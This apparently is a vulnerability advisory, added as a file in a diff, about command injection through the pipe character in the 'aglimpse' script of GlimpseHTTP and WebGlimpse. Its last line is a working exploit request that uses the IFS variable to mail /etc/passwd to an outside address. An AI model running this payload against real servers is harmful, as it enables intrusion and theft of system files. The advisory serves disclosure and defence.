@@ -1,0 +1,5 @@
+source: http://www.securityfocus.com/bid/2026/info
+
+WebGlimpse and GlimpseHTTP are web indexing and search engine programs with some associated management scripts. GlimpseHTTP up to and including 2.0, and WebGlimpse prior to version 1.5, suffer from a common vulnerability involving the component "aglimpse". This script fails to filter the pipe metacharacter, allowing arbitrary command execution. The demonstration exploit for this vulnerability includes the unix shell "IFS" (Internal Field Separator) variable for situations where the web server filters space characters - by setting this to an acceptable character ("5" in the example exploit) it is possible to use commands with more than one field. (eg., "mail me@myhost.tld"). 
+
+GET /cgi-bin/aglimpse|IFS=5;CMD=mail5drazvan\@pop3.kappa.ro\</etc/passwd;eval5$CMD;echo 
